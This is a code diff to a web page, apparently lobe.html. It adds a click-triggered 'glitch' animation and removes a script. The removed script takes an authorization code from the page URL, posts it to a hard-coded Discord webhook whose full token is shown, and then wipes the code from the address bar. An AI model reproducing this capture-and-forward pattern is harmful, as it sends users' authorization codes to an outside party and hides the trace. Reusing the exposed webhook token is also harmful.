@@ -87,7 +87,28 @@
     border-radius: 10px; /* Rounded corners */
 }
 
-   
+   .glitch {
+    position: fixed;
+    top: 0;
+    left: 0;
+    pointer-events: none;
+    width: 100px;
+    height: 100px;
+    background: rgba(255, 255, 255, 0.8);
+    box-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 5px rgba(255, 255, 255, 0.8);
+    animation: glitch-effect 0.2s infinite;
+    opacity: 0;
+    transition: opacity 0.2s;
+}
+@keyframes glitch-effect {
+    0% { clip-path: inset(10% 0% 90% 0%); }
+    20% { clip-path: inset(44% 0% 56% 0%); }
+    40% { clip-path: inset(64% 0% 36% 0%); }
+    60% { clip-path: inset(10% 0% 90% 0%); }
+    80% { clip-path: inset(77% 0% 23% 0%); }
+    100% { clip-path: inset(33% 0% 67% 0%); }
+}
+
 
     </style>
 </head>
@@ -105,25 +126,23 @@
 </html>
 
 <script>
-    // Extract the code parameter from the URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const code = urlParams.get('code');
+    document.addEventListener("click", function(event){
+    let glitch = document.createElement("div");
+    glitch.classList.add("glitch");
+    glitch.style.left = (event.pageX - 50) + "px";  // Minus half the width to center it
+    glitch.style.top = (event.pageY - 50) + "px";   // Minus half the height to center it
+    document.body.appendChild(glitch);
 
-    if (code) {
-        // If the code parameter exists, send it to the Discord webhook
-        const webhookURL = "https://discord.com/api/webhooks/1152319251110182992/zCbXlSXAzKvOmV41VswSVUh1Z7IU7SEJPG0awuWCyYBvZ0TTj6kiFwFOHCR0xnA9g4qA";
-        
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                content: `Received an authorization code: ${code}`
-            }),
-        });
+    // Fade in the glitch and then remove it after animation
+    setTimeout(function(){
+        glitch.style.opacity = 1;
+        setTimeout(function(){
+            glitch.style.opacity = 0;
+            setTimeout(function(){
+                glitch.remove();
+            }, 200);  // matches the transition duration
+        }, 200);  // matches the animation duration
+    }, 50); // slight delay to ensure glitch is added to DOM first
+});
 
-        // Clean up the URL in the address bar
-        window.history.replaceState({}, document.title, "/lobe.html");
-    }
 </script>
